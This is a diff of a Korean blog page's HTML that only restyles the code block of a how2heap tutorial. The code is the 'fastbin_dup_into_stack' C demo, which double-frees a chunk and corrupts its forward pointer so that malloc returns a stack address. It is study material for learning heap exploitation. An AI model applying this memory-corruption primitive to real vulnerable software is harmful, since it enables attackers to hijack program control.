@@ -20,19 +20,19 @@
     
         <meta name="keywords" content="Theory">
     
-    <meta name="description" content="fastbin_dup_into_stack.c #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt;  int main() { 	fprintf(stderr, &quot;malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\n&quot; 			&quot;이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)">
+    <meta name="description" content="fastbin_dup_into_stack.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main()&amp;#123;	fprintf(stderr, &quot;ma">
 <meta name="keywords" content="Theory">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[How2Heap] fastbin_dup_into_stack">
 <meta property="og:url" content="http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="fastbin_dup_into_stack.c #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt;  int main() { 	fprintf(stderr, &quot;malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\n&quot; 			&quot;이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)">
+<meta property="og:description" content="fastbin_dup_into_stack.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main()&amp;#123;	fprintf(stderr, &quot;ma">
 <meta property="og:locale" content="ko">
 <meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58421442-eb3e7980-80ca-11e9-96a0-2a0d2c3ead8d.png">
 <meta property="og:updated_time" content="2019-05-29T07:15:56.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[How2Heap] fastbin_dup_into_stack">
-<meta name="twitter:description" content="fastbin_dup_into_stack.c #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt;  int main() { 	fprintf(stderr, &quot;malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\n&quot; 			&quot;이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)">
+<meta name="twitter:description" content="fastbin_dup_into_stack.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main()&amp;#123;	fprintf(stderr, &quot;ma">
 <meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58421442-eb3e7980-80ca-11e9-96a0-2a0d2c3ead8d.png">
     
 	<link rel="canonical" href="http://j0n9hyun.github.io/2019/05/27/how2heap-fastbin-dup-into-stack-c/">
@@ -64,7 +64,7 @@
     
 
 
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+</head>
 </html>
 <body>
     <div id="wrap">
@@ -182,62 +182,13 @@
         <a class="tag-link" href="/tags/Theory/">Theory</a>
     </div>
 
-  			<span class="reading-time">⏱ 3 분</span>
+  			<span class="reading-time">⏱ 4 분</span>
             </div>
         
         
         <div class="article-entry" itemprop="articleBody">
             <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="fastbin_dup_into_stackc"><a class="markdownIt-Anchor" href="#fastbin_dup_into_stackc"></a> fastbin_dup_into_stack.c</h3>
-<pre class="highlight"><code class="c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
-<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
-
-<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
-</span>{
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\n"</span>
-			<span class="hljs-string">"이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)\n"</span>);
-
-	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> stack_var;
-
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"malloc이 반환해야 할 주소: %p.\n"</span>, <span class="hljs-number">8</span>+(<span class="hljs-keyword">char</span> *)&amp;stack_var);
-
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"버퍼를 3개 할당한다.\n"</span>);
-	<span class="hljs-keyword">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);
-	<span class="hljs-keyword">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);
-	<span class="hljs-keyword">int</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);
-
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"malloc a(8): %p\n"</span>, a);
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"malloc b(8): %p\n"</span>, b);
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"malloc c(8): %p\n"</span>, c);
-
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"-------free(a)-------\n"</span>);
-	<span class="hljs-built_in">free</span>(a);
-
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"-------free(b)-------\n"</span>);
-	<span class="hljs-built_in">free</span>(b);
-
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"-------free(a)-------\n"</span>);
-	<span class="hljs-built_in">free</span>(a);
-
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"free list: [ %p, %p, %p ]\n"</span>
-		<span class="hljs-string">"이제 %p(a)에 있는 데이터를 수정하여 공격할 것이다.\n"</span>, a, b, a, a);
-	<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);
-
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"1st malloc(8): %p\n"</span>, d);
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"2nd malloc(8): %p\n"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"free list: [ %p ]\n"</span>, a);
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"이제 우리는 이게 free list의 head로 남아있는 동안 %p에 접근이 가능하다.\n"</span>
-		<span class="hljs-string">"그래서 stack에 fake free size(0x20)를 써준다.\n"</span>
-		<span class="hljs-string">"그러면 malloc은 거기에 free chunk가 있다고 생각할 것이고\n"</span>
-		<span class="hljs-string">"그곳으로 포인터를 반환할 것이다.\n"</span>, a);
-	stack_var = <span class="hljs-number">0x20</span>;
-
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"이제 %p에 있는 데이터의 처음 8바이트를 overwrite하여 0x20 바로 앞에 가리키도록 한다.\n"</span>, a);
-	*d = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>) (((<span class="hljs-keyword">char</span>*)&amp;stack_var) - <span class="hljs-keyword">sizeof</span>(d));
-
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"3rd malloc(8): %p, free list에 stack 주소를 넣는다.\n"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));
-	<span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"4th malloc(8): %p\n"</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>));
-}
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\n"</span></span><br><span class="line">			<span class="string">"이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc이 반환해야 할 주소: %p.\n"</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"버퍼를 3개 할당한다.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc a(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc b(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc c(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(b)-------\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p, %p, %p ]\n"</span></span><br><span class="line">		<span class="string">"이제 %p(a)에 있는 데이터를 수정하여 공격할 것이다.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"free list: [ %p ]\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 우리는 이게 free list의 head로 남아있는 동안 %p에 접근이 가능하다.\n"</span></span><br><span class="line">		<span class="string">"그래서 stack에 fake free size(0x20)를 써준다.\n"</span></span><br><span class="line">		<span class="string">"그러면 malloc은 거기에 free chunk가 있다고 생각할 것이고\n"</span></span><br><span class="line">		<span class="string">"그곳으로 포인터를 반환할 것이다.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 %p에 있는 데이터의 처음 8바이트를 overwrite하여 0x20 바로 앞에 가리키도록 한다.\n"</span>, a);</span><br><span class="line">	*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, free list에 stack 주소를 넣는다.\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><small><center>[fastbin_dup_into_stack.c]</center></small><br><br>
 <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58421442-eb3e7980-80ca-11e9-96a0-2a0d2c3ead8d.png"><br>
 <img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58422108-b4696300-80cc-11e9-9c6f-31db09f069bb.png"></p>
@@ -257,7 +208,7 @@
 
 
 
-    <a data-url="http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/" data-id="ck00o3nqo000vz7fpgip9tmw1" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/" data-id="ck00obmk3000yhifpob68pw1i" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -336,14 +287,8 @@
         "dateModified": "2019-05-29",
         "url": "http://j0n9hyun.github.io/2019/05/27/How2Heap-fastbin-dup-into-stack-c/",
         "description": " fastbin_dup_into_stack.c
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-
-int main()
-{
-	fprintf(stderr, "malloc을 tricking하는 fastbin_dup.c의 확장적 부분을 설명한다.\n"
-			"이번에는 포인터를 조작된 위치로 반환한다.(이 경우엔 stack)"
-        "wordCount": 307
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;	fprintf(stderr, "ma"
+        "wordCount": 408
     }
 </script>
 
